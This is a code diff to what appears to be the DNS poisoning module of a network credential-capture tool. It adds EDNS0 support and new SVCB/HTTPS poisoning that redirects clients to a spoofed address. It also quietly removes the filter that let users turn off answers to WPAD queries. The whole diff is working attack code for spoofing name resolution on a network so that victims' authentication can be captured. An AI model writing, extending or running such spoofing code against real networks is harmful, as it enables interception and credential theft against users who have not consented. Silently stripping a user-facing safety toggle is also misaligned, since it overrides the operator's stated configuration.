@@ -17,6 +17,7 @@
 #
 # Features:
 # - Responds to A, AAAA, SOA, MX, TXT, SRV, and ANY queries
+# - OPT record (EDNS0) support for modern DNS clients
 # - SOA records to appear as authoritative DNS server
 # - MX record poisoning for email client authentication capture
 # - SRV record poisoning for service discovery (Kerberos, LDAP, etc.)
@@ -50,6 +51,9 @@ class DNS(BaseRequestHandler):
 			transaction_id = data[0:2]
 			flags = struct.unpack('>H', data[2:4])[0]
 			questions = struct.unpack('>H', data[4:6])[0]
+			answer_rrs = struct.unpack('>H', data[6:8])[0]
+			authority_rrs = struct.unpack('>H', data[8:10])[0]
+			additional_rrs = struct.unpack('>H', data[10:12])[0]
 			
 			# Check if it's a query (QR bit = 0)
 			if flags & 0x8000:
@@ -61,13 +65,25 @@ class DNS(BaseRequestHandler):
 			if not query_name:
 				return
 			
+			# Check for OPT record in additional section
+			opt_record = None
+			if additional_rrs > 0:
+				opt_record = self.parse_opt_record(data, offset)
+			
 			# Log the query
 			if settings.Config.Verbose:
 				query_type_name = self.get_type_name(query_type)
-				print(text('[DNS] Query from %s: %s (%s)' % (
+				opt_info = ''
+				if opt_record:
+					opt_info = ' [EDNS0: UDP=%d, DO=%s]' % (
+						opt_record['udp_size'],
+						'Yes' if opt_record['dnssec_ok'] else 'No'
+					)
+				print(text('[DNS] Query from %s: %s (%s)%s' % (
 					self.client_address[0].replace('::ffff:', ''),
 					query_name,
-					query_type_name
+					query_type_name,
+					opt_info
 				)))
 			
 			# Check if we should respond to this query
@@ -80,7 +96,8 @@ class DNS(BaseRequestHandler):
 				query_name,
 				query_type,
 				query_class,
-				data
+				data,
+				opt_record
 			)
 			
 			if response:
@@ -138,6 +155,90 @@ class DNS(BaseRequestHandler):
 		except:
 			return None, None, None, offset
 	
+	def parse_opt_record(self, data, offset):
+		"""
+		Parse OPT pseudo-RR from additional section (EDNS0)
+		
+		OPT RR format:
+		- NAME: domain name (should be root: 0x00)
+		- TYPE: OPT (41)
+		- CLASS: requestor's UDP payload size
+		- TTL: extended RCODE and flags (4 bytes)
+		  - Byte 0: Extended RCODE
+		  - Byte 1: EDNS version
+		  - Bytes 2-3: Flags (bit 15 = DNSSEC OK)
+		- RDLENGTH: length of RDATA
+		- RDATA: {attribute, value} pairs
+		"""
+		try:
+			# Skip any answer/authority records to get to additional section
+			# For simplicity, we'll scan for OPT record (TYPE=41)
+			
+			while offset < len(data):
+				# Check if we're at a name
+				if offset >= len(data):
+					return None
+				
+				# Skip name (could be label or pointer)
+				name_start = offset
+				while offset < len(data):
+					length = data[offset]
+					if length == 0:
+						offset += 1
+						break
+					if (length & 0xC0) == 0xC0:
+						offset += 2
+						break
+					offset += length + 1
+				
+				# Check if we have enough data for type, class, ttl, rdlength
+				if offset + 10 > len(data):
+					return None
+				
+				rr_type = struct.unpack('>H', data[offset:offset+2])[0]
+				offset += 2
+				
+				if rr_type == 41:  # OPT record found
+					udp_payload_size = struct.unpack('>H', data[offset:offset+2])[0]
+					offset += 2
+					
+					# TTL field contains extended RCODE and flags
+					ttl_bytes = data[offset:offset+4]
+					extended_rcode = ttl_bytes[0]
+					edns_version = ttl_bytes[1]
+					flags = struct.unpack('>H', ttl_bytes[2:4])[0]
+					dnssec_ok = bool(flags & 0x8000)  # DO bit
+					offset += 4
+					
+					rdlength = struct.unpack('>H', data[offset:offset+2])[0]
+					offset += 2
+					
+					# RDATA contains option codes (we'll just skip for now)
+					rdata = data[offset:offset+rdlength] if rdlength > 0 else b''
+					
+					return {
+						'udp_size': udp_payload_size,
+						'extended_rcode': extended_rcode,
+						'edns_version': edns_version,
+						'dnssec_ok': dnssec_ok,
+						'rdata': rdata
+					}
+				else:
+					# Skip this RR
+					offset += 2  # class
+					offset += 4  # ttl
+					if offset + 2 > len(data):
+						return None
+					rdlength = struct.unpack('>H', data[offset:offset+2])[0]
+					offset += 2 + rdlength
+			
+			return None
+		
+		except Exception as e:
+			if settings.Config.Verbose:
+				print(text('[DNS] Error parsing OPT record: %s' % str(e)))
+			return None
+	
 	def should_respond(self, query_name, query_type):
 		"""Determine if we should respond to this DNS query"""
 		
@@ -147,14 +248,10 @@ class DNS(BaseRequestHandler):
 		
 		# Respond to these query types:
 		# A (1), SOA (6), MX (15), TXT (16), AAAA (28), SRV (33), ANY (255)
-		supported_types = [1, 6, 15, 16, 28, 33, 255]
+		# SVCB (64), HTTPS (65) - Service Binding records
+		supported_types = [1, 6, 15, 16, 28, 33, 64, 65, 255]
 		if query_type not in supported_types:
 			return False
-		
-		# Filter out WPAD queries if configured
-		if not settings.Config.WPAD_On_Off:
-			if 'wpad' in query_name.lower():
-				return False
 		
 		# Check if domain is in analyze mode targets
 		if hasattr(settings.Config, 'AnalyzeMode'):
@@ -174,11 +271,11 @@ class DNS(BaseRequestHandler):
 				'fullhash': query_name
 			})
 		
-		# Respond to everything
+		# Respond to everything that passed the filters
 		return True
 	
-	def build_response(self, transaction_id, query_name, query_type, query_class, original_data):
-		"""Build DNS response packet"""
+	def build_response(self, transaction_id, query_name, query_type, query_class, original_data, opt_record=None):
+		"""Build DNS response packet with optional OPT record support"""
 		try:
 			# DNS Header
 			response = transaction_id  # Transaction ID
@@ -191,7 +288,10 @@ class DNS(BaseRequestHandler):
 			response += struct.pack('>H', 1)  # 1 question
 			response += struct.pack('>H', 1)  # 1 answer
 			response += struct.pack('>H', 0)  # 0 authority
-			response += struct.pack('>H', 0)  # 0 additional
+			
+			# Additional RRs count (1 if we have OPT record)
+			additional_count = 1 if opt_record else 0
+			response += struct.pack('>H', additional_count)
 			
 			# Question section (copy from original query)
 			# Find question section in original data
@@ -311,12 +411,80 @@ class DNS(BaseRequestHandler):
 				response += struct.pack('>H', 4)
 				response += socket.inet_aton(target_ip)
 			
+			elif query_type == 64 or query_type == 65:  # SVCB (64) or HTTPS (65) record
+				# Service Binding records - respond with alias to same domain
+				# This tells clients to use A/AAAA records for the service
+				# SVCB format: priority, target, params
+				
+				# Priority 0 = AliasMode (just use A/AAAA of target)
+				svcb_data = struct.pack('>H', 0)  # Priority 0 (alias)
+				# Target: pointer to query name (use our domain)
+				svcb_data += b'\xc0\x0c'  # Pointer to query name
+				
+				response += struct.pack('>H', len(svcb_data))
+				response += svcb_data
+				
+				if settings.Config.Verbose:
+					record_type = 'HTTPS' if query_type == 65 else 'SVCB'
+					print(color('[DNS] %s record poisoned - alias mode' % record_type, 3, 1))
+			
+			# Add OPT record to additional section if client sent one
+			if opt_record:
+				response += self.build_opt_record(opt_record)
+			
 			return response
 		
 		except Exception as e:
 			if settings.Config.Verbose:
 				print(text('[DNS] Error building response: %s' % str(e)))
 			return None
+	
+	def build_opt_record(self, client_opt):
+		"""
+		Build OPT pseudo-RR for EDNS0 response
+		
+		This indicates our server supports EDNS0 extensions
+		"""
+		try:
+			opt_rr = b''
+			
+			# NAME: root domain (empty)
+			opt_rr += b'\x00'
+			
+			# TYPE: OPT (41)
+			opt_rr += struct.pack('>H', 41)
+			
+			# CLASS: UDP payload size we support (typically 4096 or 512)
+			# Match client's size or use reasonable default
+			udp_size = min(client_opt['udp_size'], 4096) if client_opt['udp_size'] > 512 else 4096
+			opt_rr += struct.pack('>H', udp_size)
+			
+			# TTL: Extended RCODE and flags
+			# Byte 0: Extended RCODE (0 = no error)
+			# Byte 1: EDNS version (0)
+			# Bytes 2-3: Flags (we don't set DNSSEC OK in response)
+			extended_rcode = 0
+			edns_version = 0
+			flags = 0  # No flags set (we don't support DNSSEC)
+			
+			opt_rr += struct.pack('B', extended_rcode)
+			opt_rr += struct.pack('B', edns_version)
+			opt_rr += struct.pack('>H', flags)
+			
+			# RDLENGTH: 0 (no additional options)
+			opt_rr += struct.pack('>H', 0)
+			
+			# RDATA: empty (no options)
+			
+			if settings.Config.Verbose:
+				print(color('[DNS] Added OPT record to response (EDNS0)', 4, 1))
+			
+			return opt_rr
+		
+		except Exception as e:
+			if settings.Config.Verbose:
+				print(text('[DNS] Error building OPT record: %s' % str(e)))
+			return b''
 	
 	def get_target_ip(self, query_type):
 		"""Get the target IP address for spoofed responses"""
@@ -382,6 +550,9 @@ class DNS(BaseRequestHandler):
 			16: 'TXT',
 			28: 'AAAA',
 			33: 'SRV',
+			41: 'OPT',
+			64: 'SVCB',
+			65: 'HTTPS',
 			255: 'ANY'
 		}
 		return types.get(query_type, 'TYPE%d' % query_type)
@@ -416,6 +587,9 @@ class DNSTCP(BaseRequestHandler):
 			transaction_id = data[0:2]
 			flags = struct.unpack('>H', data[2:4])[0]
 			questions = struct.unpack('>H', data[4:6])[0]
+			answer_rrs = struct.unpack('>H', data[6:8])[0]
+			authority_rrs = struct.unpack('>H', data[8:10])[0]
+			additional_rrs = struct.unpack('>H', data[10:12])[0]
 			
 			# Check if it's a query
 			if flags & 0x8000:
@@ -431,13 +605,22 @@ class DNSTCP(BaseRequestHandler):
 			if not query_name:
 				return
 			
+			# Check for OPT record
+			opt_record = None
+			if additional_rrs > 0:
+				opt_record = dns_handler.parse_opt_record(data, offset)
+			
 			# Log the query
 			if settings.Config.Verbose:
 				query_type_name = dns_handler.get_type_name(query_type)
-				print(text('[DNS-TCP] Query from %s: %s (%s)' % (
+				opt_info = ''
+				if opt_record:
+					opt_info = ' [EDNS0: UDP=%d]' % opt_record['udp_size']
+				print(text('[DNS-TCP] Query from %s: %s (%s)%s' % (
 					self.client_address[0].replace('::ffff:', ''),
 					query_name,
-					query_type_name
+					query_type_name,
+					opt_info
 				)))
 			
 			# Check if we should respond
@@ -450,7 +633,8 @@ class DNSTCP(BaseRequestHandler):
 				query_name,
 				query_type,
 				query_class,
-				data
+				data,
+				opt_record
 			)
 			
 			if response:
